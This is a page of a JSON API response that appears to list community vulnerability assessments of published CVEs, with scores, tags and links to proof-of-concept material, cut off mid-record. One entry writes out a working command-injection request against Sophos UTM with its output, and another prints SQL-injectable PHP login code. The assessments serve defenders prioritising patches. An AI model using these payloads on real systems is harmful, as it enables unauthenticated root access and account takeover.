{
  "links": {
    "next": {
      "href": "/v1/assessments?expand=tags&page=12&size=100&sort=created%3Aasc"
    },
    "prev": {
      "href": "/v1/assessments?expand=tags&page=10&size=100&sort=created%3Aasc"
    },
    "self": {
      "href": "/v1/assessments?expand=tags&page=11&size=100&sort=created%3Aasc"
    }
  },
  "data": [
    {
      "id": "acb45353-8818-4478-882c-cba990b8c4ff",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "fc9e0abc-cafb-4f50-9362-44285d1412fd",
      "created": "2021-08-13T11:57:54.095746Z",
      "revisionDate": "2021-08-13T11:59:41.851478Z",
      "document": "Link: https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-38603\r\n\r\nVulnerability parameter in profil.php \"id_content\"\r\nNOTE: The same problem is in the demo account in the online version\r\nhttps://www.softaculous.com/softaculous/demos/PluXml\r\n\r\nProof: https://streamable.com/5rf36u",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "cf6a9ad9-1064-4fc3-b3fb-10f0fd4fc3ef",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "08e6848d-56cb-4bd7-8bd5-197859c3da2d",
      "created": "2021-08-16T11:07:35.529901Z",
      "revisionDate": "2021-08-16T15:47:21.151234Z",
      "document": "TastyIgniter 3.0.7 allows XSS - Stored\r\n\r\n## Vulnerability Assessment\r\nXSS-Stored Allow 48 characters\r\n\r\n## Url\r\nhttp://192.168.1.3/setup-master/admin/customers/create\r\n\r\n## Payload \r\nhttps://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-38699\r\n\r\n## Vulnerable parameter\r\nCustomer[first_name]\r\n\r\n## Proof: \r\nhttps://streamable.com/75b6ob",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "427cbd63-1c6e-49cf-ba60-48371218420c",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "c5fbf733-241b-4d6f-9424-d403969fc060",
      "created": "2021-08-17T14:20:28.933369Z",
      "revisionDate": "2021-08-17T14:20:28.93362Z",
      "document": "XSS-Stored PHPSESSID user PWNED on Hospital Management System Vulnerable parameter \"txtMsg\" on contact \r\n## Reproduce: \r\nhttps://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-38757\r\n## Proof:\r\nhttps://streamable.com/6xue3b",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "d8c5cc55-995a-44ca-8d60-5e7139a74274",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "7dd22e12-dc79-418f-a67e-debc167dbdbe",
      "created": "2021-08-24T10:27:47.247786Z",
      "revisionDate": "2021-08-26T16:13:48.1157Z",
      "document": "## Description:\r\nThe Online-Catering-Reservation-DT Food-Catering(by: oretnom23)v1.0 is vulnerable\r\nin the application /catering/classes/Login.php which is called from /catering/dist/js/script.js app. \r\nThe parameter (username) from the login form is not protected correctly and there is no security and escaping from malicious payloads. \r\nWhen the user is sending a request to the MySQL server he can bypass the login credentials and take control of the administer account.\r\n\r\n## More: \r\nhttps://www.nu11secur1ty.com/2021/08/online-catering-reservation-dt-sql.html\r\n## More: \r\nhttps://github.com/nu11secur1ty/CVE-mitre/tree/main/Online-Catering-Reservation-DT-Food-Catering\r\n\r\n- and on the owner of the exploit, on the home page: \r\nhttps://www.nu11secur1ty.com/2021/08/online-catering-reservation-dt-sql.html\r\n\r\n## Simple proof and simple fix but not strong! =)\r\nhttps://streamable.com/7qfnkl\r\n\r\n## BR\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Credential Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "14a61fa9-9bd4-497b-981b-9971d877d58b",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "39ae7f32-95c6-4b33-b99f-293449699fb9",
      "created": "2021-08-24T19:21:42.072824Z",
      "revisionDate": "2021-09-01T15:19:26.752237Z",
      "document": "There exists a race condition bug in the Windows Installer.  Specifically, the Windows installer maintains a rollback script of tasks to be performed in the event that an installation fails.  If an installation fails, that rollback script will be run as system.  By overwriting that script and placing an instruction to overwrite a specific DLL within that script, an attacker can overwrite a trusted DLL.  One bright spot is that the default policy for Windows server prevents non-admins from performing installations, blocking this path for elevation.\r\nIn the original write-up by SandboxEscaper, the exploit required GUI interaction, but later PoCs released negated the requirement for clicking on pop-up windows.\r\nMicrosoft as attempted to patch this exploit on several occasions, but several patches proved to be incomplete, failing to account for file junctions or other bypass techniques.  CVEs issued to bypasses include:\r\nCVE-2021-1727\r\nCVE-2020-16902 \r\nCVE-2020-0814\r\nCVE-2020-1302\r\nLinks:\r\nhttps://www.exploit-db.com/exploits/46916\r\nhttps://ssd-disclosure.com/ssd-advisory-windows-installer-elevation-of-privileges-vulnerability/\r\nhttps://halove23.blogspot.com/2020/12/oh-so-you-have-antivirus-nameevery-bug.html\r\nhttps://github.com/klinix5/CVE-2021-1727",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "8ddc7257-dcba-48db-95e6-d31bf8282d0f",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "ea650aec-1792-4d2f-9e86-7792e578df10",
      "created": "2021-08-25T09:43:58.645051Z",
      "revisionDate": "2021-08-25T09:43:58.645629Z",
      "document": "# Description:\r\nThe B&E Tracker (by: oretnom23 ) v1.0 is vulnerable\r\nin the application /expense_budget/classes/Login.php which is called from /expense_budget/dist/js/script.js app. \r\nThe parameter (username) from the login form is not protected correctly and there is no security and escaping from malicious payloads. \r\nWhen the user is sending a request to the MySQL server he can bypass the login credentials and take control of the administer account.\r\n# Reproduce:\r\nhttps://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/B%26E%20Tracker-by:oretnom23-v1.0\r\n# Proof:\r\nhttps://streamable.com/y3ig5h\r\n# BR nu11secur1ty",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "6e444ff3-cc36-43ae-a7f5-b85461b2bd34",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "bad73e56-8c5c-4884-850e-b6f60ee4b516",
      "created": "2021-08-25T16:40:45.791884Z",
      "revisionDate": "2021-09-01T15:19:19.304236Z",
      "document": "The SES-by_oretnom23 -v1.0 is vulnerable in the application /elearning/classes/Login.php which is called from /elearning/dist/js/script.js app. The parameter (username) from the login form is not protected correctly and there is no security and escaping from malicious payloads. When the user is sending a request to the MySQL server he can bypass the login credentials and take control of the administer account.\r\n\r\n## Reproduce:\r\nhttps://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/SES-by_oretnom23%20-v1.0\r\n\r\n## Proof:\r\nhttps://streamable.com/kswjbi",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "52b53157-4d66-4b8c-a1ce-065df6f369eb",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "0b46025d-a4c7-4fb0-ada5-7244a30e7d6e",
      "created": "2021-08-25T17:02:30.245421Z",
      "revisionDate": "2021-08-25T17:02:30.245087Z",
      "document": "PoC exploit is publicly available https://www.atredis.com/blog/2021/8/18/sophos-utm-cve-2020-25223",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "d6e0dff3-dd46-4f19-831d-c3f3f2fa972a",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "0b46025d-a4c7-4fb0-ada5-7244a30e7d6e",
      "created": "2021-08-26T02:01:09.022407Z",
      "revisionDate": "2021-11-03T11:33:08.701364Z",
      "document": "_Please see the [Atredis writeup](https://www.atredis.com/blog/2021/8/18/sophos-utm-cve-2020-25223) for root cause analysis._\r\n\r\nCVE-2020-25223 has high attacker value and exploitability, since Sophos UTM is a [next-generation firewall (NGFW)](https://en.wikipedia.org/wiki/Next-generation_firewall), and the vulnerability offers unauthenticated attackers root access to a \"network pivot\" device, all through a single HTTP request, demonstrated below:\r\n\r\n```\r\nwvu@kharak:~$ curl -kv https://172.16.57.254:4444/var -H \"Content-Type: application/json; charset=UTF-8\" -d '{\"SID\":\"|touch /tmp/vulnerable|\"}'\r\n*   Trying 172.16.57.254...\r\n* TCP_NODELAY set\r\n* Connected to 172.16.57.254 (172.16.57.254) port 4444 (#0)\r\n* ALPN, offering h2\r\n* ALPN, offering http/1.1\r\n* successfully set certificate verify locations:\r\n*   CAfile: /etc/ssl/cert.pem\r\n  CApath: none\r\n* TLSv1.2 (OUT), TLS handshake, Client hello (1):\r\n* TLSv1.2 (IN), TLS handshake, Server hello (2):\r\n* TLSv1.2 (IN), TLS handshake, Certificate (11):\r\n* TLSv1.2 (IN), TLS handshake, Server key exchange (12):\r\n* TLSv1.2 (IN), TLS handshake, Server finished (14):\r\n* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):\r\n* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):\r\n* TLSv1.2 (OUT), TLS handshake, Finished (20):\r\n* TLSv1.2 (IN), TLS change cipher, Change cipher spec (1):\r\n* TLSv1.2 (IN), TLS handshake, Finished (20):\r\n* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384\r\n* ALPN, server accepted to use http/1.1\r\n* Server certificate:\r\n*  subject: C=de; ST=Baden-Wuerttemberg; L=Karlsruhe; O=Sophos; CN=host.domain.example; emailAddress=firewall@domain.example\r\n*  start date: Feb 24 14:46:04 2015 GMT\r\n*  expire date: Jan 24 14:46:04 2017 GMT\r\n*  issuer: C=de; ST=Baden-Wuerttemberg; L=Karlsruhe; O=Sophos; CN=Sophos Default CA; emailAddress=firewall@domain.example\r\n*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.\r\n> POST /var HTTP/1.1\r\n> Host: 172.16.57.254:4444\r\n> User-Agent: curl/7.64.1\r\n> Accept: */*\r\n> Content-Type: application/json; charset=UTF-8\r\n> Content-Length: 33\r\n>\r\n* upload completely sent off: 33 out of 33 bytes\r\n< HTTP/1.1 200 OK\r\n< Date: Thu, 26 Aug 2021 04:17:09 GMT\r\n< Server: Apache\r\n< Expires: Thursday, 01-Jan-1970 00:00:01 GMT\r\n< Pragma: no-cache\r\n< X-Frame-Options: SAMEORIGIN\r\n< Strict-Transport-Security: max-age=63072000; includeSubDomains;\r\n< X-Content-Type-Options: nosniff\r\n< X-XSS-Protection: 1; mode=block\r\n< Content-Security-Policy: default-src 'self'; img-src 'self' data:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; connect-src 'self' wss:;\r\n< X-Content-Security-Policy: default-src 'self'; img-src 'self' data:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; connect-src 'self' wss:;\r\n< X-Webkit-CSP: default-src 'self'; img-src 'self' data:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; connect-src 'self' wss:;\r\n< Vary: Accept-Encoding\r\n< Transfer-Encoding: chunked\r\n< Content-Type: application/json; charset=utf-8\r\n<\r\n* Connection #0 to host 172.16.57.254 left intact\r\n{\"RID\":\"\",\"objs\":[{\"js\":\"json_abort(true);\"},{\"alert\":\"Backend connection failed, please click Shift-Reload to try again.\"}]}* Closing connection 0\r\nwvu@kharak:~$\r\n```\r\n\r\n```\r\nhost:/root # ls -l /tmp/vulnerable\r\n-rw-r--r-- 1 root root 0 Aug 25 23:17 /tmp/vulnerable\r\nhost:/root #\r\n```\r\n\r\nChecking for the vulnerability can be accomplished by injecting a `sleep` command and timing the request's completion:\r\n\r\n```\r\nwvu@kharak:~$ time curl -kv https://172.16.57.254:4444/var -H \"Content-Type: application/json; charset=UTF-8\" -d '{\"SID\":\"|sleep 10|\"}'\r\n*   Trying 172.16.57.254...\r\n* TCP_NODELAY set\r\n* Connected to 172.16.57.254 (172.16.57.254) port 4444 (#0)\r\n* ALPN, offering h2\r\n* ALPN, offering http/1.1\r\n* successfully set certificate verify locations:\r\n*   CAfile: /etc/ssl/cert.pem\r\n  CApath: none\r\n* TLSv1.2 (OUT), TLS handshake, Client hello (1):\r\n* TLSv1.2 (IN), TLS handshake, Server hello (2):\r\n* TLSv1.2 (IN), TLS handshake, Certificate (11):\r\n* TLSv1.2 (IN), TLS handshake, Server key exchange (12):\r\n* TLSv1.2 (IN), TLS handshake, Server finished (14):\r\n* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):\r\n* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):\r\n* TLSv1.2 (OUT), TLS handshake, Finished (20):\r\n* TLSv1.2 (IN), TLS change cipher, Change cipher spec (1):\r\n* TLSv1.2 (IN), TLS handshake, Finished (20):\r\n* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384\r\n* ALPN, server accepted to use http/1.1\r\n* Server certificate:\r\n*  subject: C=de; ST=Baden-Wuerttemberg; L=Karlsruhe; O=Sophos; CN=host.domain.example; emailAddress=firewall@domain.example\r\n*  start date: Feb 24 14:46:04 2015 GMT\r\n*  expire date: Jan 24 14:46:04 2017 GMT\r\n*  issuer: C=de; ST=Baden-Wuerttemberg; L=Karlsruhe; O=Sophos; CN=Sophos Default CA; emailAddress=firewall@domain.example\r\n*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.\r\n> POST /var HTTP/1.1\r\n> Host: 172.16.57.254:4444\r\n> User-Agent: curl/7.64.1\r\n> Accept: */*\r\n> Content-Type: application/json; charset=UTF-8\r\n> Content-Length: 20\r\n>\r\n* upload completely sent off: 20 out of 20 bytes\r\n< HTTP/1.1 200 OK\r\n< Date: Thu, 26 Aug 2021 15:47:17 GMT\r\n< Server: Apache\r\n< Expires: Thursday, 01-Jan-1970 00:00:01 GMT\r\n< Pragma: no-cache\r\n< X-Frame-Options: SAMEORIGIN\r\n< Strict-Transport-Security: max-age=63072000; includeSubDomains;\r\n< X-Content-Type-Options: nosniff\r\n< X-XSS-Protection: 1; mode=block\r\n< Content-Security-Policy: default-src 'self'; img-src 'self' data:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; connect-src 'self' wss:;\r\n< X-Content-Security-Policy: default-src 'self'; img-src 'self' data:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; connect-src 'self' wss:;\r\n< X-Webkit-CSP: default-src 'self'; img-src 'self' data:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; connect-src 'self' wss:;\r\n< Vary: Accept-Encoding\r\n< Transfer-Encoding: chunked\r\n< Content-Type: application/json; charset=utf-8\r\n<\r\n* Connection #0 to host 172.16.57.254 left intact\r\n{\"RID\":\"\",\"objs\":[{\"js\":\"json_abort(true);\"},{\"alert\":\"Backend connection failed, please click Shift-Reload to try again.\"}]}* Closing connection 0\r\n\r\nreal\t0m10.114s\r\nuser\t0m0.020s\r\nsys\t0m0.018s\r\nwvu@kharak:~$\r\n```",
      "score": 4,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "7a622523-6d6f-4b82-9e7a-a6d8f3bb6ae0",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "24b56e10-12ac-4f3f-b9a8-b937daa44314",
      "created": "2021-08-26T10:22:47.096125Z",
      "revisionDate": "2021-08-31T10:35:27.719461Z",
      "document": "# Description:\r\nCross-Site Scripting (XSS SVG - Stored - PWNED PHPSESSID RCE) vulnerability exists in FlatCore-CMS 2.0.7 via the upload image function. \r\nWhen the malicious user trick the administrator of the CMS system to upload the malicious SVG file, then\r\nhe can be already executed this code from everywhere on the internet, and the thing will be more worst than ever for the owner of this CMS system! ;)\r\n\r\n@nu11secur1ty\r\n\r\n--------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\n## Reproduce:\r\nhttps://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-39609\r\n\r\n## Proof:\r\nhttps://streamable.com/p13hgj\r\n\r\n## Proof: PHPSESSID PWNED\r\nhttps://streamable.com/9aj8o6",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Discovery",
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": []
    },
    {
      "id": "98307c35-c248-4354-82f8-bbfc75a9a3b6",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "b86ff102-0fbc-45a5-8d59-b98ca36bfcf9",
      "created": "2021-08-30T16:59:34.153344Z",
      "revisionDate": "2021-08-31T19:00:28.830896Z",
      "document": "An unauthenticated actor can perform configuration actions on mailboxes belonging to arbitrary users. Which can be used to copy all emails addressed to a target and account and forward them to an account controlled by the threat actor.\r\n\r\nhttps://www.zerodayinitiative.com/blog/2021/8/30/proxytoken-an-authentication-bypass-in-microsoft-exchange-server",
      "score": 3,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": []
    },
    {
      "id": "3c35bf15-2dec-440e-aa0e-b7da68022463",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "83b08213-9ae0-4624-bccb-c3a41f86aa9c",
      "created": "2021-08-30T22:29:24.528152Z",
      "revisionDate": "2021-08-31T16:35:45.198505Z",
      "document": "This vulnerability occurs due to a flaw in calculating safe bounds while performing arithmetic involving a pointer and a scalar when the scalar's actual value is not known. The verifier calculates a minimum and maximum value (for both signed and unsigned numbers) that can be safely added / subtracted to / from the pointer to ensure that out-of-bounds memory is not accessed. Additionally, the verifier uses the `var_off` bound to represent what it knows about the current state of the register that the bound is for. The `__reg_bound_offset32()` function was added in order to update bounds specifically when 32-bit conditionals are performed; however, the technique used to calculate and update bounds can result in bounds that are less than the actual value of the register, meaning that the verifier can be tricked into allowing out-of-bounds reads and writes after all.\r\n\r\nI'm not well-versed in exploiting out-of-bounds writes on Linux, but based off of the [blog post](https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification) , triggering the vulnerability seems fairly straightforward at least. The vulnerability didn't make it to many mainline distro releases, so I reduced the exploitability rating a bit. In the rare chance that you are running a kernel version vulnerable to this, definitely prioritize this and patch your system.",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "c436a7dc-0b63-4298-9cfc-1a13dca5e7a4",
      "editorId": "65729f1a-edfe-469e-94ed-f675454a0cd8",
      "topicId": "24b56e10-12ac-4f3f-b9a8-b937daa44314",
      "created": "2021-08-31T10:40:35.198824Z",
      "revisionDate": "2021-09-03T17:01:27.25333Z",
      "document": "",
      "score": 0,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": []
    },
    {
      "id": "2e3e8e38-bd54-47c7-b368-958921dbd37a",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "934c6033-0c6f-4e2c-a428-9379aff6ad2f",
      "created": "2021-08-31T14:17:32.594398Z",
      "revisionDate": "2021-09-01T16:44:50.274348Z",
      "document": "# CVE-nu11-04\r\n## Covid-19 Contact Tracing System Web App with QR Code Scanning CTS-QR (by: oretnom23 ) v1.0\r\n\r\n![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/oretnom23/CVE-nu11-04/docs/Capture.PNG)\r\n\r\n## Vendor:\r\n- [href](https://www.sourcecodester.com/php/14728/covid-19-contact-tracing-system-web-app-qr-code-scanning-using-php-source-code.html)\r\n- \r\n## Software\r\n- [href](https://www.mediafire.com/file/hnpjyei7saq2h8e/cts_qr_1.zip/file)\r\n\r\n## Broken query:\r\n```php\r\n\tpublic function login(){\r\n\t\textract($_POST);\r\n\r\n\t\t$qry = $this->conn->query(\"SELECT * from users where username = '$username' and password = md5('$password') \");\r\n\t\tif($qry->num_rows > 0){\r\n\t\t\tforeach($qry->fetch_array() as $k => $v){\r\n\t\t\t\tif(!is_numeric($k) && $k != 'password'){\r\n\t\t\t\t\t$this->settings->set_userdata($k,$v);\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n```\r\n## The fix, but not strong enough!\r\n \r\n```php\r\n\tpublic function login(){\r\n\t\textract($_POST);\r\n\r\n\t\t$qry = $this->conn->query(\"SELECT * from users where username = ('$username') and password = md5('$password') \");\r\n\t\tif($qry->num_rows > 0){\r\n\t\t\tforeach($qry->fetch_array() as $k => $v){\r\n\t\t\t\tif(!is_numeric($k) && $k != 'password'){\r\n\t\t\t\t\t$this->settings->set_userdata($k,$v);\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n```\r\n## Proof:\r\n![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/oretnom23/CVE-nu11-04/docs/CVE-nu11-04.gif)\r\n- [+][video](https://streamable.com/e6pm04)\r\n\r\n\r\n## Description:\r\nThe Covid-19 Contact Tracing System Web App with QR Code Scanning CTS-QR (by: oretnom23 ) v1.0 is vulnerable in the application /cts_qr/classes/Login.php from SQL-Injection-Bypass-Authentication\r\nm0re info: https://portswigger.net/support/using-sql-injection-to-bypass-authentication. \r\nThe parameter (username) from the login form is not protected correctly and there is no security and escaping from malicious payloads. \r\nWhen the user will sending a malicious query or malicious payload to the MySQL server he can bypass the login credentials and take control of the administer account.\r\n\r\n## Please, report here:\r\n- [+][href](https://www.youtube.com/watch?v=6voxW97vFMM)\r\n### NOTE:\r\n- - - [+] `The owner is not satisfied with the fact that all his projects are using the same broken MySQL query architecture.` =)\r\n\r\n## M0re:\r\n- [+] [href](https://streamable.com/luf1bw)\r\n\r\n## Conclusion and solution of the problem:\r\n- [+][href](https://www.nu11secur1ty.com/2021/08/php-sec-login.html)\r\n\r\n## BR \r\n- [+] @nu11secur1ty",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
